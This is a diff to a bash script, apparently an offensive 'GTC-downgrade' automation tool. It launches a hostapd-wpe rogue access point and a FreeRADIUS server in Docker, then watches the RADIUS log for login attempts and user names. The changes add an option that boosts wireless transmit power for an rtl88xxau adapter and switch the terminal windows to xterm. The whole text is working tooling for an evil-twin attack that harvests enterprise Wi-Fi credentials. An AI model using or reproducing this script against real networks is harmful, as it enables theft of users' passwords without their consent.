@@ -26,6 +26,7 @@ EOF
 QUICK=
 FULL=
 INTERFACE=
+DRIVER=
 SSID=
 CHANNEL=
 C_NAME=
@@ -39,9 +40,15 @@ CURRENT_PATH="`pwd`"
 
 runCheck()
 {
+    if [[ $DRIVER == 'Y' ]] || [[ $DRIVER == 'y' ]]
+    then
+	iwconfig $INTERFACE txpower 30
+    fi
     echo "[!] GTC-downgrade automation script v.1 - Viet Luu"
-    gnome-terminal -x sh -c "docker run --rm -t -i --privileged --net=host -v $(pwd):/conf hostapd-wpe-domain hostapd-wpe /conf/hostapd.conf && nmcli n off && rfkill unblock all && ifconfig $INTERFACE up bash" 
-    gnome-terminal -x sh -c "tail -f $CURRENT_PATH/logs/radius.log | grep -i --color=always -i -E 'login\sattempt\swith|User-Name\s'; bash "
+    xterm -fa monaco -fs 11 -hold -e "docker run --rm -t -i --privileged --net=host -v $(pwd):/conf hostapd-wpe-domain hostapd-wpe /conf/hostapd.conf && nmcli n off && rfkill unblock all && ifconfig $INTERFACE up" &
+    # gnome-terminal -x sh -c "docker run --rm -t -i --privileged --net=host -v $(pwd):/conf hostapd-wpe-domain hostapd-wpe /conf/hostapd.conf && nmcli n off && rfkill unblock all && ifconfig $INTERFACE up bash" 
+    xterm -fa monaco -fs 11 -hold -e "tail -f $CURRENT_PATH/logs/radius.log | grep -i --color=always -i -E 'login\sattempt\swith|User-Name\s'" &
+    # gnome-terminal -x sh -c "tail -f $CURRENT_PATH/logs/radius.log | grep -i --color=always -i -E 'login\sattempt\swith|User-Name\s'; bash "
     docker run --rm -t -i --name radiusd -v $(pwd)/logs:/logs -v $(pwd):/conf hostapd-gtc-downgrade radiusd -X -l /logs/radius.log -d conf/raddb   
 }
 
@@ -76,6 +83,8 @@ else
     then
         echo -n '[?] Interface [ENTER]: '
         read INTERFACE
+	echo -n '[?] rtl88xxau Driver (Y/N)'
+	read DRIVER
         echo -n '[?] SSID [ENTER]: '
         read SSID
         echo -n '[?] CHANNEL [ENTER]: '
